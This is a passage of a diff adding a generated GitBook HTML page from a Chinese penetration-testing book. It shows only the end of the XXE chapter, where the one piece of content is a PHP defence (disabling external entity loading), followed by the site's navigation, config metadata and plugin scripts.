+<li><img src="../../../../assets/img/xxe_injection_demo.png" alt="xxe_injection_demo"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>&#x9632;&#x62A4;=&#x5BF9;&#x7B56;<ul>
+<li>&#x4E3E;&#x4F8B;<ul>
+<li>PHP<ul>
+<li>&#x7981;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF1A;<code>libxml_disable_entity_loader</code>&#x8BBE;&#x7F6E;&#x4E3A;<code>TRUE</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<footer class="page-footer"><span class="copyright">crifan.com&#xFF0C;&#x4F7F;&#x7528;<a href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">&#x7F72;&#x540D;4.0&#x56FD;&#x9645;(CC BY 4.0)&#x534F;&#x8BAE;</a>&#x53D1;&#x5E03; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6700;&#x540E;&#x66F4;&#x65B0;&#xFF1A;
+2021-05-27 20:09:06
+</span></footer>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: XML文件">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../../../backend/" class="navigation navigation-next " aria-label="Next page: 后端">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"XXE","level":"1.3.1.3.5.1","depth":5,"next":{"title":"后端","level":"1.3.2","depth":2,"path":"penetration_method/backend/README.md","ref":"penetration_method/backend/README.md","articles":[{"title":"SQL注入","level":"1.3.2.1","depth":3,"path":"penetration_method/backend/sql_injection.md","ref":"penetration_method/backend/sql_injection.md","articles":[]},{"title":"RCE/RCI","level":"1.3.2.2","depth":3,"path":"penetration_method/backend/rce_rci.md","ref":"penetration_method/backend/rce_rci.md","articles":[]},{"title":"SSRF","level":"1.3.2.3","depth":3,"path":"penetration_method/backend/ssrf.md","ref":"penetration_method/backend/ssrf.md","articles":[]},{"title":"CORS","level":"1.3.2.4","depth":3,"path":"penetration_method/backend/cors.md","ref":"penetration_method/backend/cors.md","articles":[]},{"title":"越权访问","level":"1.3.2.5","depth":3,"path":"penetration_method/backend/unauthorized_access.md","ref":"penetration_method/backend/unauthorized_access.md","articles":[]},{"title":"后端语言","level":"1.3.2.6","depth":3,"path":"penetration_method/backend/server_language/README.md","ref":"penetration_method/backend/server_language/README.md","articles":[{"title":"Java","level":"1.3.2.6.1","depth":4,"path":"penetration_method/backend/server_language/java/README.md","ref":"penetration_method/backend/server_language/java/README.md","articles":[{"title":"JAVA反序列化","level":"1.3.2.6.1.1","depth":5,"path":"penetration_method/backend/server_language/java/java_deserial.md","ref":"penetration_method/backend/server_language/java/java_deserial.md","articles":[]},{"title":"struts2","level":"1.3.2.6.1.2","depth":5,"path":"penetration_method/backend/server_language/java/struts2.md","ref":"penetration_method/backend/server_language/java/struts2.md","articles":[]}]}]}]},"previous":{"title":"XML文件","level":"1.3.1.3.5","depth":4,"path":"penetration_method/web_frontend/file/xml/README.md","ref":"penetration_method/web_frontend/file/xml/README.md","articles":[{"title":"XXE","level":"1.3.1.3.5.1","depth":5,"path":"penetration_method/web_frontend/file/xml/xxe.md","ref":"penetration_method/web_frontend/file/xml/xxe.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["google-adsense","theme-comscore","anchors","-lunr","-search","search-plus","disqus","-highlight","prism","prism-themes","github-buttons","splitter","-sharing","sharing-plus","tbfed-pagefooter","expandable-chapters-small","ga","donate","sitemap-general","copy-code-button","callouts","toolbar-button"],"root":"./src","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"crifan.com，使用<a href='https://creativecommons.org/licenses/by/4.0/deed.zh'>署名4.0国际(CC BY 4.0)协议</a>发布","modify_label":"最后更新：","modify_format":"YYYY-MM-DD HH:mm:ss"},"prism":{"css":["prism-themes/themes/prism-atom-dark.css"]},"disqus":{"useIdentifier":false,"shortName":"crifan"},"callouts":{"showTypeInHeader":false},"toolbar-button":{"label":"下载PDF","url":"http://book.crifan.com/books/infiltrate_your_net_penetration_testing/pdf/infiltrate_your_net_penetration_testing.pdf","icon":"fa-file-pdf-o"},"splitter":{},"autocover":{"title":"Gitbook演示"},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"https://www.crifan.com/files/res/crifan_com/crifan_alipay_pay.jpg","alipayText":"支付宝打赏给Crifan","button":"打赏","title":"","wechat":"https://www.crifan.com/files/res/crifan_com/crifan_wechat_pay.jpg","wechatText":"微信打赏给Crifan"},"sitemap-general":{"prefix":"https://book.crifan.com/gitbook/infiltrate_your_net_penetration_testing/website/"},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"prism-themes":{},"google-adsense":{"ads":[{"client":"ca-pub-6626240105039250"}]},"github-buttons":{"buttons":[{"repo":"infiltrate_your_net_penetration_testing","user":"crifan","type":"star","count":true,"size":"small"},{"user":"crifan","type":"follow","width":"120","count":false,"size":"small"}]},"expandable-chapters-small":{},"copy-code-button":{},"ga":{"configuration":"auto","token":"UA-28297199-1"},"sharing":{"qq":true,"all":["douban","facebook","google","instapaper","line","linkedin","messenger","pocket","qq","qzone","stumbleupon","twitter","viber","vk","weibo","whatsapp"],"douban":false,"facebook":true,"weibo":true,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":true},"anchors":{},"search-plus":{}},"theme":"default","author":"Crifan Li <admin@crifan.com>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"潜入你的网络：渗透测试","language":"zh-hans","links":{"sidebar":{"主页":"http://www.crifan.com"}},"gitbook":"3.2.3","description":"先对渗透测试进行宏观概述，属于安全方向的哪个子领域。再介绍基本的渗透测试和攻击的大体流程和涉及内容，再整理出网络攻击和防御的全流程和涉及的方方面面的内容。总结各种渗透测试的手段，包括Web前端的代码注入类的XSS跨站脚本攻击、CSRF跨站请求伪造，后端的SQL注入、RCE远程代码执行、SSRF服务端请求伪造、CORS跨域资源共享、越权访问，后端语言比如Java的反序列号、struts2等，以及文件类的文件包含、文件上传、目录浏览、任意文件读取和下载、XML文件的XXE等；以及其他渗透测试工具，比如漏洞扫描类的Metasploit、AppScan、AWVS、BurpSuite、Cobalt Strike、Nessus、ZAP和其他一些不常见的工具；以及端口扫描类的nmap、Layer等，注入类的sqlmap等工具；然后根据渗透测试阶段，分渗透前、渗透中、渗透后；以及相关的安全分析等内容。"},"file":{"path":"penetration_method/web_frontend/file/xml/xxe.md","mtime":"2021-05-27T12:09:06.917Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-07-17T13:42:10.885Z"},"basePath":"../../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../../gitbook/gitbook.js"></script>
+    <script src="../../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-google-adsense/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/URI.js/1.16.1/URI.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-disqus/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-toolbar-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
